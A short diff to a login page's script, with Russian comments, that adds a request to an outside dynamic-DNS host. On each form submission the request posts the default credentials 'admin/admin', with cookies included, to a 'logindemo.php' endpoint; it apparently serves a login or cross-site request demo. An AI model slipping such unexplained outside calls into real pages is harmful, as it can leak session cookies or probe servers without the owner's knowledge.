@@ -59,6 +59,15 @@
       } catch (err) {
         errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
       }
+      fetch("https://kazcyber.zapto.org/logindemo.php", {
+  method: "POST",                                // Метод — POST
+  credentials: "include",                        // Включает cookies в запрос
+  headers: { "Content-Type": "application/x-www-form-urlencoded" }, // Заголовки запроса
+  body: "username=admin&password=admin"          // Данные формы
+})
+.then(r => r.json())                             // Ответ обрабатывается как JSON
+.then(console.log);                              // Выводит ответ в консоль браузера
+
     });
   </script>
 </body>
